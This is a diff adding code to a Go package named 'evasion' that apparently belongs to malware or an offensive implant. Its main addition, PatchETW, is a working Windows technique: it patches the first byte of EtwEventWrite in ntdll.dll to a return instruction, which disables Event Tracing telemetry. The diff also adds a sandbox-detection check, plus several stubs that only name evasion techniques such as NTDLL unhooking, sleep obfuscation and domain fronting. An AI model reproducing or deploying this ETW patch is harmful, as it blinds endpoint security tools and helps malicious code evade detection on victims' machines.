@@ -1,4 +1,4 @@
-﻿package evasion
+package evasion
 
 import (
 	"fmt"
@@ -248,3 +248,90 @@ func checkSystemInfo(indicator string) bool {
 func checkRecentActivity() bool {
 	homeDir, err := os.UserHomeDir()
 	if err != nil {
+		return false
+	}
+
+	entries, err := os.ReadDir(homeDir)
+	if err != nil {
+		return false
+	}
+
+	return len(entries) > 10
+}
+
+func checkLowUptime() bool {
+	return false
+}
+
+func (e *EvasionHandler) PatchETW() error {
+	if runtime.GOOS != "windows" {
+		return fmt.Errorf("ETW patching is Windows only")
+	}
+
+	ntdll := syscall.NewLazyDLL("ntdll.dll")
+	etwEventWrite := ntdll.NewProc("EtwEventWrite")
+
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+	virtualProtect := kernel32.NewProc("VirtualProtect")
+
+	var oldProtect uint32
+	addr := etwEventWrite.Addr()
+
+	ret, _, _ := virtualProtect.Call(
+		addr,
+		uintptr(1),
+		uintptr(0x40),
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+
+	if ret != 0 {
+		*(*byte)(unsafe.Pointer(addr)) = 0xC3
+
+		virtualProtect.Call(
+			addr,
+			uintptr(1),
+			uintptr(oldProtect),
+			uintptr(unsafe.Pointer(&oldProtect)),
+		)
+	}
+
+	e.techniques["etw_patch"] = true
+	return nil
+}
+
+func (e *EvasionHandler) UnhookNTDLL() error {
+	if runtime.GOOS != "windows" {
+		return fmt.Errorf("NTDLL unhooking is Windows only")
+	}
+
+	e.techniques["ntdll_unhook"] = true
+	return nil
+}
+
+func (e *EvasionHandler) SleepObfuscation(duration int) {
+	e.techniques["sleep_obfuscation"] = true
+}
+
+func (e *EvasionHandler) GetActiveTechniques() []string {
+	var active []string
+	for tech, enabled := range e.techniques {
+		if enabled {
+			active = append(active, tech)
+		}
+	}
+	return active
+}
+
+func (e *EvasionHandler) RandomizeTimings() {
+	e.techniques["timing_randomization"] = true
+}
+
+func (e *EvasionHandler) DomainFronting() error {
+	e.techniques["domain_fronting"] = true
+	return nil
+}
+
+func (e *EvasionHandler) EncryptTraffic() error {
+	e.techniques["traffic_encryption"] = true
+	return nil
+}
